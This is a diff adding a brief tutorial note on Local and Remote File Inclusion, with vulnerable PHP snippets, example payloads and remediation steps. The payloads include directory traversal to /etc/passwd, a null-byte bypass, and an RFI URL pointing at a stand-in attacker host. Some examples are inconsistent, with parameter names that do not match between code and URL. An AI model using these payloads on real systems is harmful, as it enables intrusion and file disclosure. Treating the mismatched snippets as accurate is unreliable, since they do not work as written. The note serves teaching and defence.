@@ -1,0 +1,75 @@
+
+Local File Inclusion
+---------------------
+
+Local File Inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of 
+vulnerable inclusion procedures implemented in the application. 
+The vulnerability occurs due to the use of user-supplied input without proper validation.
+
+This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, 
+allowing directory traversal characters (such as dot-dot-slash) to be injected. 
+
+
+Remote File Inclusion
+----------------------
+Remote File Inclusion (also known as RFI) is the process of including remote files, that are extracted from the HTTP request, through the exploiting of 
+vulnerable inclusion procedures implemented in the application. 
+The vulnerability occurs due to the use of user-supplied input without proper validation.
+
+This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, 
+allowing external URL to be injected. 
+
+
+
+
+
+
+
+This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:
+	• Code execution on the web server
+	• Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)
+	• Denial of Service (DoS)
+	• Sensitive Information Disclosure
+
+
+
+LFI Example
+------------
+	Main URI :: 	http://vulnerable_host/preview.php?file=example.html
+
+Case 1: 
+	Internal Code :: 	<?php “include/”.include($_GET[‘filename’]); ?>
+	Payload ::		http://vulnerable_host/preview.php?file=../../../../etc/passwd
+
+
+Case 2: 
+	Internal Code :: 	<?php “include/”.include($_GET[‘filename’].“.php”); ?>
+	Payload ::		http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
+
+		In the Case 2, simple substitution with arbitrary filename would not work as the postfix ‘php’ is appended. 
+		In order to bypass it, a technique with null-byte terminators is used. 
+		Since %00 effectively presents the end of the string, any characters after this special byte will be ignored. 
+
+
+
+
+RFI Example
+------------
+
+	Internal Code ::	$incfile = $_REQUEST[“file”];
+				include($incfile.”.php”);
+
+	Payload ::		http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page
+
+
+
+
+
+Remediation:
+-------------
+	1. The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. 
+	2. If this is not possible the application can maintain a white list of files, that may be included by the page, 
+	3. and then use an identifier (for example the index number) to access to the selected file. 
+	4. Any request containing an invalid identifier has to be rejected,
+
+
